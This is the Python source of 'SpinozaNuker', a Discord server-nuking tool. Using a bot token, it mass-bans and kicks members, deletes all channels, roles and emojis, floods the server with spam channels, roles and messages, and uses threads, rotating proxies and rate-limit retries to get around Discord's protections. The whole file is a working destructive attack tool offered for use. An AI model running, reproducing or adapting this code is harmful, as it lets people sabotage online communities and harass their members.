import threading, webbrowser, discord, random, httpx, json, time, os; from discord.ext import commands;from itertools import cycle; from colorama import Fore

VERSION = "v1"

__intents__ = discord.Intents.default()
__intents__.members = True
__proxies__, __client__, __config__, __threads__= cycle(open("proxies.txt", "r").read().splitlines()), commands.Bot(command_prefix="+", help_command=None, intents=__intents__), json.load(open("config.json", "r", encoding="utf-8")), 45
token = __config__["token"]
os.system("cls") if os.name == "nt" else os.system("clear")

SpinozaNuker_art = """
\x1b[34m ███████╗██████╗ ██╗███╗   ██╗ ██████╗ ███████╗ █████╗     ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
 ██╔════╝██╔══██╗██║████╗  ██║██╔═══██╗╚══███╔╝██╔══██╗    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
 ███████╗██████╔╝██║██╔██╗ ██║██║   ██║  ███╔╝ ███████║    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
 ╚════██║██╔═══╝ ██║██║╚██╗██║██║   ██║ ███╔╝  ██╔══██║    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
 ███████║██║     ██║██║ ╚████║╚██████╔╝███████╗██║  ██║    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
 ╚══════╝╚═╝     ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝\x1b[0m

""".format("\x1b[38;5;17m", "\x1b[38;5;18m", "\x1b[38;5;19m", "\x1b[38;5;20m", "\x1b[38;5;21m", "\x1b[0m")
options = """
  ({}1{}) {}> {}Ban Members 
  ({}2{}) {}> {}Kick Members              
  
  ({}3{}) {}> {}Create Spam Channel                     
  ({}4{}) {}> {}Create Spam Role
  ({}5{}) {}> {}Spam Messages
  
  ({}6{}) {}> {}Delete Channels
  ({}7{}) {}> {}Delete Roles
  ({}8{}) {}> {}Delete Emojis
  
  ({}0{}) {}> {}Log out

  If you overload the server, you will encounter errors in the tool due to Discord protection, 
  ignore this and continue your process by typing "python main.py" and entering the server id.

  If {}you{} see a {}specific error{}, try {}Ctrl + C{}.""".format("\x1b[38;5;21m", Fore.RESET, "\x1b[38;5;21m", Fore.RESET, "\x1b[38;5;21m", Fore.RESET, "\x1b[38;5;21m", Fore.RESET, "\x1b[38;5;21m", Fore.RESET, "\x1b[38;5;21m", Fore.RESET,
           "\x1b[38;5;21m", Fore.RESET, "\x1b[38;5;21m", Fore.RESET, "\x1b[38;5;21m", Fore.RESET, "\x1b[38;5;21m", Fore.RESET, "\x1b[38;5;21m", Fore.RESET, "\x1b[38;5;21m", Fore.RESET, 
           "\x1b[38;5;21m", Fore.RESET, "\x1b[38;5;21m", Fore.RESET, "\x1b[38;5;21m", Fore.RESET, "\x1b[38;5;21m", Fore.RESET, "\x1b[38;5;21m", Fore.RESET, "\x1b[38;5;21m", Fore.RESET,
           "\x1b[38;5;21m", Fore.RESET, "\x1b[38;5;21m", Fore.RESET, "\x1b[38;5;21m", Fore.RESET, "\x1b[38;5;21m", Fore.RESET, "\x1b[38;5;21m", Fore.RESET, "\x1b[38;5;21m", Fore.RESET)

class SpinozaNuker:
    def __init__(self):
        self.proxy = "http://" + next(__proxies__) if __config__["proxy"] == True else None
        self.session = httpx.Client(proxies=self.proxy)
        self.version = cycle(['v10', 'v9'])
        self.banned = []
        self.kicked = []
        self.channels = []
        self.roles = []
        self.emojis = []
        self.messages = []

 
    def execute_ban(self, guildid: str, member: str, token: str):
        payload = {
            "delete_message_days": random.randint(0, 7)
        }
        while True:
            response = self.session.put(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/bans/{member}", headers={"Authorization": f"Bot {token}"}, json=payload)
            if response.status_code in [200, 201, 204]:
                print("{}({}SpinozaNuker{}) Banned: {}{}".format(Fore.RESET, "\x1b[38;5;21m", Fore.RESET, "\x1b[38;5;21m", member))
                self.banned.append(member)
                break
            elif "retry_after" in response.text:
                time.sleep(response.json()['retry_after'])
            elif "Missing Permissions" in response.text:
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                print("{}({}!{}) You're being excluded from discord API {}{}".format(Fore.RESET, Fore.YELLOW, Fore.RESET))
                break
            elif "Max number of bans for non-guild members have been exceeded." in response.text:
                print("{}({}!{}) Max number of bans for non-guild members have been exceeded".format(Fore.RESET, Fore.YELLOW, Fore.RESET))
                break
            else:
                break
            
    
    def execute_kick(self, guildid: str, member: str, token: str):
        while True:
            response = self.session.delete(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/members/{member}", headers={"Authorization": f"Bot {token}"})
            if response.status_code in [200, 201, 204]:
                print("{}({}SpinozaNuker{}) Atıldı: {}{}".format(Fore.RESET, "\x1b[38;5;21m", Fore.RESET, "\x1b[38;5;21m", member))
                self.kicked.append(member)
                break
            elif "retry_after" in response.text:
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                print("{}({}!{}) You're being excluded from discord API {}{}".format(Fore.RESET, Fore.YELLOW, Fore.RESET))
                break
            else:
                break
            
    
    def execute_prune(self, guildid: str, days: int, token: str):
        payload = {
            "days": days
        }
        response = self.session.post(f"https://discord.com/api/v9/guilds/{guildid}/prune", headers={"Authorization": f"Bot {token}"}, json=payload)
        if response.status_code == 200:
            print("{}({}SpinozaNuker{}) Pruned {}{}{} members".format(Fore.RESET, "\x1b[38;5;21m", Fore.RESET, "\x1b[38;5;21m", response.json()['pruned'], Fore.RESET))
        elif "Max number of prune requests has been reached. Try again later" in response.text:
            print("{}({}!{}) Max number of prune reached. Try again in {}s".format(Fore.RESET, Fore.YELLOW, Fore.RESET, response.json()['retry_after']))
        elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
            print("{}({}!{}) You're being temporarly excluded from discord API".format(Fore.RESET, Fore.YELLOW, Fore.RESET))
        else:
            print("{}({}-{}) Failed to prune {}{}".format(Fore.RESET, Fore.RED, Fore.RESET, Fore.RED, guildid))
            
            
    def execute_crechannels(self, guildid: str, channelsname: str, type: int, token: str):
        payload = {
            "type": type,
            "name": channelsname,
            "permission_overwrites": []
        }
        channelsname = channelsname.replace(" ", "-")
        while True:
            response = self.session.post(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"}, json=payload)
            if response.status_code == 201:
                print("{}({}SpinozaNuker{}) Was established: {}#{}".format(Fore.RESET, "\x1b[38;5;21m", Fore.RESET, "\x1b[38;5;21m", channelsname))
                self.channels.append(1)
                break
            elif "retry_after" in response.text:
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                print("{}({}!{}) You're being temporarly excluded from discord API".format(Fore.RESET, Fore.YELLOW, Fore.RESET))
                break
            else:
                break
            
            
    def execute_creroles(self, guildid: str, rolesname: str, token: str):
        colors = random.choice([0x0000FF, 0xFFFFFF, 0xFF0000, 0x00FF00, 0x0000FF, 0xFFFF00, 0x00FFFF, 0xFF00FF, 0xC0C0C0, 0x808080, 0x800000, 0x808000, 0x008000, 0x800080, 0x008080, 0x000080])
        payload = {
            "name": rolesname,
            "color": colors
        }
        while True:
            response = self.session.post(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/roles", headers={"Authorization": f"Bot {token}"}, json=payload)
            if response.status_code == 200:
                print("{}({}SpinozaNuker{}) Was established: {}@{}".format(Fore.RESET, "\x1b[38;5;21m", Fore.RESET, "\x1b[38;5;21m", rolesname))
                self.roles.append(1)
                break
            elif "retry_after" in response.text:
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                print("{}({}!{}) You're being temporarly excluded from discord API".format(Fore.RESET, Fore.YELLOW, Fore.RESET))
                break
            else:
                break
            
    
    def execute_delchannels(self, channel: str, token: str):
        while True:
            response = self.session.delete(f"https://discord.com/api/{next(self.version)}/channels/{channel}", headers={"Authorization": f"Bot {token}"})
            if response.status_code == 200:
                print("{}({}SpinozaNuker{}) Deleted: {}{}".format(Fore.RESET, "\x1b[38;5;21m", Fore.RESET, "\x1b[38;5;21m", channel))
                self.channels.append(channel)
                break
            elif "retry_after" in response.text:
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                print("{}({}!{}) You're being temporarly excluded from discord API".format(Fore.RESET, Fore.YELLOW, Fore.RESET))
                break
            else:
                break
            
            
    def execute_delroles(self, guildid: str, role: str, token: str):
        while True:
            response = self.session.delete(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/roles/{role}", headers={"Authorization": f"Bot {token}"})
            if response.status_code == 204:
                print("{}({}SpinozaNuker{}) Deleted: {}{}".format(Fore.RESET, "\x1b[38;5;21m", Fore.RESET, "\x1b[38;5;21m", role))
                self.roles.append(role)
                break
            elif "retry_after" in response.text:
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                print("{}({}!{}) You're being temporarly excluded from discord API".format(Fore.RESET, Fore.YELLOW, Fore.RESET))
                break
            else:
                break
            
    def execute_delemojis(self, guildid: str, emoji: str, token: str):
        while True:
            response = self.session.delete(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/emojis/{emoji}", headers={"Authorization": f"Bot {token}"})
            if response.status_code == 204:
                print("{}({}SpinozaNuker{}) Deleted: {}{}".format(Fore.RESET, "\x1b[38;5;21m", Fore.RESET, "\x1b[38;5;21m", emoji))
                self.emojis.append(emoji)
                break
            elif "retry_after" in response.text:
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                print("{}({}!{}) You're being temporarly excluded from discord API".format(Fore.RESET, Fore.YELLOW, Fore.RESET))
                break
            else:
                break
            
    
    def execute_massping(self, channel: str, content: str, token: str):
        while True:
            response = self.session.post(f"https://discord.com/api/{next(self.version)}/channels/{channel}/messages", headers={"Authorization": f"Bot {token}"}, json={"content": content})
            if response.status_code == 200:
                print("{}({}SpinozaNuker{}) Spammed: {}{}{}".format(Fore.RESET, "\x1b[38;5;21m", Fore.RESET, "\x1b[38;5;21m", content, Fore.RESET, "\x1b[38;5;21m", channel))
                self.messages.append(channel)
                break
            elif "retry_after" in response.text:
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                print("{}({}!{}) You're being temporarly excluded from discord API".format(Fore.RESET, Fore.YELLOW, Fore.RESET))
                break
            else:
                break

    def menu(self):
            os.system(f"cls & title SpinozaNuker ^| {__client__.user.name}#{__client__.user.discriminator}")
            print(SpinozaNuker_art + options + "\n")
            ans = input("{}({}root@you{}) Your choice{}:{} ".format(Fore.RESET, "\x1b[38;5;21m", Fore.RESET, "\x1b[38;5;21m", Fore.RESET)) 
            
            if ans in ["1", "01"]:
                scrape = input("{}({}root@you{}) Registered IDs? [Y/N]{}:{} ".format(Fore.RESET, "\x1b[38;5;21m", Fore.RESET, "\x1b[38;5;21m", Fore.RESET))
                if scrape.lower() == "y":
                    try:
                        guild = __client__.get_guild(int(guildid))
                        with open("fetched/members.txt", "w") as a:
                            for member in guild.members:
                                a.write("{}{}".format(member.id, "\n"))
                    except: pass
                else:
                    pass
                self.banned.clear()
                members = open("fetched/members.txt", "r").read().splitlines()
                for member in members:
                    t = threading.Thread(target=self.execute_ban, args=(guildid, member, token))
                    t.start()
                    while threading.active_count() >= __threads__:
                        t.join()
                        
                time.sleep(3)
                print("{}({}SpinozaNuker{}) {}/{} Member has been banned from the server.".format(Fore.RESET, "\x1b[38;5;21m", Fore.RESET, len(self.banned), len(members)))
                time.sleep(1.5)
                self.menu()
                
            elif ans in ["2", "02"]:
                self.kicked.clear()
                members = open("fetched/members.txt", "r").read().splitlines()
                for member in members:
                    t = threading.Thread(target=self.execute_kick, args=(guildid, member, token))
                    t.start()
                    while threading.active_count() >= __threads__:
                        t.join()
                
                time.sleep(3)
                print("{}({}SpinozaNuker{}) {}/{} Member has been kicked from the server.".format(Fore.RESET, "\x1b[38;5;21m", Fore.RESET, len(self.kicked), len(members)))
                time.sleep(1.5)
                self.menu()
                
            elif ans in ["3", "03"]:
                type = input("{}({}root@you{}) Channel Type ['text', 'sound']{}:{} ".format(Fore.RESET, "\x1b[38;5;21m", Fore.RESET, "\x1b[38;5;21m", Fore.RESET))
                type = 2 if type == "sound" else 0
                amount = int(input("{}({}root@you{}) Amout{}:{} ".format(Fore.RESET, "\x1b[38;5;21m", Fore.RESET, "\x1b[38;5;21m", Fore.RESET)))
                self.channels.clear()
                for i in range(amount):
                    t = threading.Thread(target=self.execute_crechannels, args=(guildid, random.choice(__config__["nuke"]["channels_name"]), type, token))
                    t.start()
                    while threading.active_count() >= __threads__:
                        t.join()
                    
                time.sleep(3)
                print("{}({}SpinozaNuker{}) {}/{} Channel was established.".format(Fore.RESET, "\x1b[38;5;21m", Fore.RESET, len(self.channels), amount))
                time.sleep(1.5)
                self.menu()
                
            elif ans in ["4", "04"]:
                amount = int(input("{}({}root@you{}) Amout{}:{} ".format(Fore.RESET, "\x1b[38;5;21m", Fore.RESET, "\x1b[38;5;21m", Fore.RESET)))
                self.roles.clear()
                for i in range(amount):
                    t = threading.Thread(target=self.execute_creroles, args=(guildid, random.choice(__config__["nuke"]["roles_name"]), token))
                    t.start()
                    while threading.active_count() >= __threads__:
                        t.join()
                    
                time.sleep(3)
                print("{}({}SpinozaNuker{}) {}/{} Role is established.".format(Fore.RESET, "\x1b[38;5;21m", Fore.RESET, len(self.roles), amount))
                time.sleep(1.5)
                self.menu()
                
            elif ans in ["6", "06"]:
                self.channels.clear()
                channels = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"}).json()
                for channel in channels:
                    t = threading.Thread(target=self.execute_delchannels, args=(channel['id'], token))
                    t.start()
                    while threading.active_count() >= __threads__:
                        t.join()
                    
                time.sleep(3)
                print("{}({}SpinozaNuker{}) {}/{} Channel has been deleted.".format(Fore.RESET, "\x1b[38;5;21m", Fore.RESET, len(self.channels), len(channels)))
                time.sleep(1.5)
                self.menu()
                
            elif ans in ["7", "07"]:
                self.roles.clear()
                roles = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/roles", headers={"Authorization": f"Bot {token}"}).json()
                for role in roles:
                    t = threading.Thread(target=self.execute_delroles, args=(guildid, role['id'], token))
                    t.start()
                    while threading.active_count() >= __threads__:
                        t.join()
                    
                time.sleep(3)
                print("{}({}SpinozaNuker{}) {}/{} Role has been deleted.".format(Fore.RESET, "\x1b[38;5;21m", Fore.RESET, len(self.roles), len(roles)))
                time.sleep(1.5)
                self.menu()
                
            elif ans in ["8", "08"]:
                self.emojis.clear()
                emojis = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/emojis", headers={"Authorization": f"Bot {token}"}).json()
                for emoji in emojis:
                    t = threading.Thread(target=self.execute_delemojis, args=(guildid, emoji['id'], token))
                    t.start()
                    while threading.active_count() >= __threads__:
                        t.join()
                        
                time.sleep(3)
                print("{}({}SpinozaNuker{}) {}/{} Emoji has been deleted.".format(Fore.RESET, "\x1b[38;5;21m", Fore.RESET, len(self.emojis), len(emojis)))
                time.sleep(1.5)
                self.menu()
                
            elif ans in ["5", "05"]:
                self.messages.clear(); self.channels.clear()
                amount = int(input("{}({}root@you{}) Amount{}:{} ".format(Fore.RESET, "\x1b[38;5;21m", Fore.RESET, "\x1b[38;5;21m", Fore.RESET)))
                channels = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"}).json()
                for channel in channels: self.channels.append(channel['id'])
                channelz = cycle(self.channels)
                for i in range(amount):
                    t = threading.Thread(target=self.execute_massping, args=(next(channelz), random.choice(__config__["nuke"]["messages_content"]), token))
                    t.start()
                    while threading.active_count() >= __threads__ - 15:
                        t.join()
                        
                time.sleep(3)
                print("{}({}SpinozaNuker{}) {}/{} Message was spammed.".format(Fore.RESET, "\x1b[38;5;21m", Fore.RESET, len(self.messages), amount))
                time.sleep(1.5)
                self.menu()
                
            
            elif ans in ["0", "00"]:
                print("{}({}SpinozaNuker{}) Thanks for using us!".format(Fore.RESET, "\x1b[38;5;21m", Fore.RESET))
                time.sleep(1.5)
                os._exit(0)
                
            
    
@__client__.event
async def on_ready():
    print("{}({}SpinozaNuker{}) Successfully logged in{}. {}{}".format(Fore.RESET, "\x1b[38;5;21m", Fore.RESET, "\x1b[38;5;21m", Fore.RESET, f"{__client__.user.name}#{__client__.user.discriminator}"))
    time.sleep(1.5)
    nuker = SpinozaNuker()
    while True:
        try:
            nuker.menu()
        except KeyboardInterrupt:
            errormessage = "\nCtrl+C detected. Please enter the Server ID again."
            print(errormessage)
            continue
        except Exception as e:
            continue 
    

if __name__ == "__main__":
    while True:
        try:
            os.system("title SpinozaNuker ^| Login")
            guildid = input("{}({}root@you{}) Server ID{}:{} ".format(Fore.RESET, "\x1b[38;5;21m", Fore.RESET, "\x1b[38;5;21m", Fore.RESET))
            __client__.run(token)
        except EOFError:
            print("Ctrl+D detected. Exiting.")
            break  # Ctrl+D (EOFError) algılandığında döngüyü kır ve programı bitir
        except KeyboardInterrupt:
            print("\nCtrl+C detected. Please enter the Server ID again.")
            continue  # Ctrl+C (KeyboardInterrupt) algılandığında döngüyü sürdür ve tekrar Server ID iste
        except Exception as e:
            print("{}({}SpinozaNuker{}) An error occurred: {}".format(Fore.RESET, Fore.RED, Fore.RESET, e))
            time.sleep(1.5)
            continue